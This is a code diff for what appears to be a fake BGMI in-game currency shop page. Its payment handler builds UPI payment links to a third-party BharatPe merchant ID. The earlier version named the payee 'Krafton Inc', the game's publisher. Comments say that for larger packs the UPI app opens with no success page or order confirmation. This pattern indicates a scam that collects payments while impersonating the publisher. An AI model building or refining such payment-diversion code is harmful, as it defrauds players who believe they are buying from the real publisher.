@@ -1266,17 +1266,17 @@
 
     document.getElementById('back3').onclick = () => showStep(2);
 
-    // --- DIRECT UPI LINK PAYMENT LOGIC ---
+    // --- DIRECT UPI LINK PAYMENT LOGIC (QR CODE BASED) ---
     document.getElementById('razorpayBtn').onclick = function(e){
         e.preventDefault();
         
-        // UPI Intent Deep Link extracted from provided QR code details
-        const upiId = "BHARATPE.8D0W1J2281@icici";
-        const upiLink = `upi://pay?pa=${upiId}&pn=Krafton%20Inc&am=${selectedPack.price}&cu=INR&tn=BGMI%20UC%20Order%20${orderId}`;
+        // QR Code se extract kiya gaya exact UPI intent link
+        const qrCodePayload = "upi://pay?pa=BHARATPE.8D0W1J2281@icici&pn=BharatPe%20Merchant&cu=INR";
+        const upiLink = `${qrCodePayload}&am=${selectedPack.price}&tn=BGMI_Order_${orderId}`;
         
         // Agar bada pack select kiya hai (Not Rs 5)
         if (selectedPack.price !== "5" && selectedPack.price !== 5) {
-            // Sirf UPI app open hoga, button par koi changes nahi, aur na hi koi success page aayega.
+            // Sirf UPI app open hoga, Pay button waisa hi rahega
             window.location.href = upiLink;
             return; // Execution stops here for other packs
         }
